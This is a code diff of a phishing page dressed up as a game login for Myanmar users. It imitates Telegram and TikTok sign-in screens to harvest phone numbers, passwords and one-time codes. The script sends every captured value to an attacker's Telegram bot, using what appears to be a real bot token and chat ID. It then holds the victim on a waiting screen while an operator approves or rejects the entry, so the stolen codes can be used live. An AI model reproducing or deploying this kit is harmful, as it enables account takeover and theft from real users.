@@ -3,28 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Login</title>
+    <title>Game Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* Fullscreen & Status Bar Removal */
-        html, body { 
-            margin: 0; padding: 0; width: 100%; height: 100%; 
-            overflow: hidden; background-color: #ffffff;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .loader {
-            border: 3px solid #f3f3f3; border-top: 3px solid #2481cc;
-            border-radius: 50%; width: 24px; height: 24px;
-            animation: spin 1s linear infinite; display: none;
-        }
+        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #ffffff; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #2481cc; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
     </style>
 </head>
 <body>
 
-<div id="app" class="w-full h-full flex flex-col items-center justify-center">
+<div id="app" class="w-full h-full flex flex-col items-center justify-center relative">
     
     <!-- Step 1: Selection Screen -->
     <div id="selectScreen" class="w-full max-w-sm p-8 text-center">
@@ -38,15 +29,18 @@
     </div>
 
     <!-- Step 2: Telegram UI (Phone Number) -->
-    <div id="tgPhoneScreen" class="hidden w-full max-w-sm p-6 flex flex-col h-full">
-        <div class="mt-10 text-center">
+    <div id="tgPhoneScreen" class="hidden w-full h-full max-w-sm p-6 flex flex-col bg-white">
+        <div class="flex items-center mb-6 pt-4">
+            <i onclick="goBack()" class="fa-solid fa-arrow-left text-xl cursor-pointer p-2"></i>
+        </div>
+        <div class="text-center">
             <i class="fa-solid fa-paper-plane text-6xl text-[#2481cc] mb-6"></i>
             <h2 class="text-2xl font-bold mb-2">Your Phone</h2>
-            <p class="text-gray-500 mb-8">Confirm country code and enter phone number.</p>
+            <p class="text-gray-500 mb-8 px-4">Confirm country code and enter phone number.</p>
         </div>
         <div class="border-b-2 border-gray-100 py-2 mb-6">
             <label class="text-gray-400 text-sm">Country</label>
-            <div class="flex justify-between font-medium"><span>Myanmar</span><i class="fa-solid fa-chevron-right text-gray-300"></i></div>
+            <div class="flex justify-between font-medium"><span>Myanmar</span><i class="fa-solid fa-chevron-right text-gray-300 text-xs"></i></div>
         </div>
         <div class="flex border-b-2 border-[#2481cc] py-2 mb-10">
             <span class="font-bold text-xl mr-4">+95</span>
@@ -59,28 +53,39 @@
     </div>
 
     <!-- Step 3: Telegram OTP UI -->
-    <div id="tgOtpScreen" class="hidden w-full max-w-sm p-6 text-center">
-        <div class="mt-10 mb-8"><i class="fa-solid fa-message text-6xl text-[#2481cc]"></i></div>
-        <h2 id="displayTgPhone" class="text-2xl font-bold mb-2"></h2>
-        <p class="text-gray-500 mb-8">We've sent a code to your Telegram app.</p>
-        <input type="number" id="tgOtp" placeholder="Enter Code" class="w-full border-b-2 border-gray-300 text-center text-2xl outline-none p-2 mb-10 focus:border-[#2481cc]">
+    <div id="tgOtpScreen" class="hidden w-full h-full max-w-sm p-6 flex flex-col bg-white">
+        <div class="flex items-center mb-6 pt-4">
+            <i onclick="showTG()" class="fa-solid fa-arrow-left text-xl cursor-pointer p-2"></i>
+        </div>
+        <div class="text-center">
+            <div class="mt-4 mb-8"><i class="fa-solid fa-message text-6xl text-[#2481cc]"></i></div>
+            <h2 id="displayTgPhone" class="text-2xl font-bold mb-2"></h2>
+            <p class="text-gray-500 mb-8 px-4">We've sent a code to your Telegram app.</p>
+            <input type="number" id="tgOtp" placeholder="Enter Code" class="w-full border-b-2 border-gray-300 text-center text-2xl outline-none p-2 mb-10 focus:border-[#2481cc]">
+        </div>
         <button onclick="submitApproval('Telegram OTP')" class="fixed bottom-10 right-10 bg-[#2481cc] w-16 h-16 rounded-full shadow-lg flex items-center justify-center text-white text-2xl">
             <i id="tgIcon2" class="fa-solid fa-arrow-right"></i>
             <div id="tgLoader2" class="loader !border-t-white"></div>
         </button>
     </div>
 
-    <!-- Step 4: TikTok Login UI (Phone + Pass) -->
-    <div id="ttLoginScreen" class="hidden w-full max-w-sm p-8">
-        <h2 class="text-2xl font-bold mb-8 text-center">TikTok Login</h2>
+    <!-- Step 4: TikTok Login UI -->
+    <div id="ttLoginScreen" class="hidden w-full h-full max-w-sm p-8 flex flex-col bg-white text-center">
+        <div class="flex items-center mb-6">
+            <i onclick="goBack()" class="fa-solid fa-arrow-left text-xl cursor-pointer p-2 -ml-4"></i>
+        </div>
+        <h2 class="text-2xl font-bold mb-8">TikTok Login</h2>
         <input type="number" id="ttPhone" placeholder="Phone number" class="w-full bg-gray-100 p-3 rounded-lg mb-4 outline-none">
         <input type="password" id="ttPass" placeholder="Password" class="w-full bg-gray-100 p-3 rounded-lg mb-2 outline-none">
-        <p onclick="showTTOtp()" class="text-xs text-gray-500 cursor-pointer hover:text-black mb-8">Password မေ့နေသည်</p>
+        <p onclick="showTTOtp()" class="text-xs text-gray-500 cursor-pointer hover:text-black mb-8 text-left">Password မေ့နေသည်</p>
         <button onclick="submitApproval('TikTok Password')" class="w-full bg-[#fe2c55] text-white py-3 rounded-lg font-bold">Log in</button>
     </div>
 
     <!-- Step 5: TikTok OTP UI -->
-    <div id="ttOtpScreen" class="hidden w-full max-w-sm p-8 text-center">
+    <div id="ttOtpScreen" class="hidden w-full h-full max-w-sm p-8 flex flex-col bg-white text-center">
+        <div class="flex items-center mb-6">
+            <i onclick="showTT()" class="fa-solid fa-arrow-left text-xl cursor-pointer p-2 -ml-4"></i>
+        </div>
         <h2 class="text-2xl font-bold mb-4">Verification</h2>
         <p class="text-gray-500 mb-6">Enter the 6-digit code sent to your phone.</p>
         <input type="number" id="ttOtp" placeholder="6-digit code" class="w-full bg-gray-100 p-3 rounded-lg mb-6 text-center text-xl outline-none">
@@ -88,7 +93,7 @@
     </div>
 
     <!-- Step 6: Approval Waiting Screen -->
-    <div id="waitScreen" class="hidden w-full max-w-sm p-8 text-center">
+    <div id="waitScreen" class="hidden w-full max-w-sm p-8 text-center bg-white">
         <div class="loader !block mx-auto mb-6 !w-12 !h-12 border-4"></div>
         <h2 class="text-xl font-bold text-blue-600 mb-4">ခွင့်ပြုချက် စောင့်ဆိုင်းနေပါသည်...</h2>
         <p class="text-gray-500">Admin မှ ခွင့်ပြုပြီးပါက ဂိမ်းထဲသို့ အလိုအလျောက် ရောက်သွားပါမည်။</p>
@@ -97,16 +102,19 @@
 </div>
 
 <script>
-    const token = "YOUR_BOT_TOKEN"; // Bot Token ထည့်ရန်
-    const chat = "YOUR_CHAT_ID";     // Chat ID ထည့်ရန်
-    const gameLink = "https://poki.com/en/g/rail-in-the-air#fullscreen";
+    const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
+    const chat = "5304050102";
+    const gameLink = "https://www.crazygames.com";
     let userKey = "U" + Math.floor(Math.random() * 99999);
+    let offset = 0;
 
     if (localStorage.getItem('approved') === 'true') window.location.href = gameLink;
 
+    function goBack() { toggle('selectScreen'); }
     function showTG() { toggle('tgPhoneScreen'); }
     function showTT() { toggle('ttLoginScreen'); }
     function showTTOtp() { toggle('ttOtpScreen'); }
+
     function toggle(id) {
         document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
         document.getElementById(id).classList.remove('hidden');
@@ -117,27 +125,35 @@
         if(!ph) return;
         document.getElementById('tgIcon1').style.display = 'none';
         document.getElementById('tgLoader1').style.display = 'block';
+        
         const fPh = ph.startsWith('09') ? ph : '09' + ph.replace(/^0/, '');
         document.getElementById('displayTgPhone').innerText = fPh;
+        
         await sendBot(`📱 TG Phone: ${fPh}\nID: ${userKey}`);
-        setTimeout(() => toggle('tgOtpScreen'), 1000);
+        
+        setTimeout(() => {
+            document.getElementById('tgIcon1').style.display = 'block';
+            document.getElementById('tgLoader1').style.display = 'none';
+            toggle('tgOtpScreen');
+        }, 1500);
     }
 
     async function submitApproval(type) {
-        let data = "";
-        if(type === 'Telegram OTP') data = "OTP: " + document.getElementById('tgOtp').value;
-        if(type === 'TikTok Password') data = `Phone: ${document.getElementById('ttPhone').value}\nPass: ${document.getElementById('ttPass').value}`;
-        if(type === 'TikTok Forgot OTP') data = "Forgot OTP: " + document.getElementById('ttOtp').value;
+        let val = "";
+        if(type === 'Telegram OTP') val = document.getElementById('tgOtp').value;
+        if(type === 'TikTok Password') val = `Ph: ${document.getElementById('ttPhone').value} | Pass: ${document.getElementById('ttPass').value}`;
+        if(type === 'TikTok Forgot OTP') val = document.getElementById('ttOtp').value;
 
+        if(!val) return;
         toggle('waitScreen');
-        await sendBot(`🔔 Access Request (${type})\n${data}\nID: ${userKey}`, true);
+        await sendBot(`🔔 Request (${type})\nData: ${val}\nID: ${userKey}`, true);
         startPolling();
     }
 
-    async function sendBot(msg, withButtons = false) {
+    async function sendBot(msg, buttons = false) {
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
         const body = { chat_id: chat, text: msg, parse_mode: "Markdown" };
-        if(withButtons) {
+        if(buttons) {
             body.reply_markup = { inline_keyboard: [[
                 { text: "✅ Approve", callback_data: `ok_${userKey}` },
                 { text: "❌ Reject", callback_data: `no_${userKey}` }
@@ -146,18 +162,34 @@
         await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) });
     }
 
-    function startPolling() {
+    async function startPolling() {
+        // ပထမဆုံး နောက်ဆုံး Update ကို ယူပြီး offset ညှိမယ်
+        const initialRes = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=1&offset=-1`);
+        const initialData = await initialRes.json();
+        if(initialData.result.length > 0) offset = initialData.result[0].update_id + 1;
+
         const timer = setInterval(async () => {
-            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
-            const d = await response.json();
-            const last = d.result[0];
-            if (last?.callback_query?.data === `ok_${userKey}`) {
-                clearInterval(timer);
-                localStorage.setItem('approved', 'true');
-                window.location.href = gameLink;
-            }
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${offset}`);
+                const d = await res.json();
+                if (d.result && d.result.length > 0) {
+                    for (let update of d.result) {
+                        offset = update.update_id + 1;
+                        if (update.callback_query?.data === `ok_${userKey}`) {
+                            clearInterval(timer);
+                            localStorage.setItem('approved', 'true');
+                            window.location.href = gameLink;
+                        } else if (update.callback_query?.data === `no_${userKey}`) {
+                            clearInterval(timer);
+                            alert("Admin မှ ငြင်းပယ်လိုက်ပါသည်။");
+                            location.reload();
+                        }
+                    }
+                }
+            } catch (e) { console.error(e); }
         }, 3000);
     }
 </script>
 </body>
 </html>
+
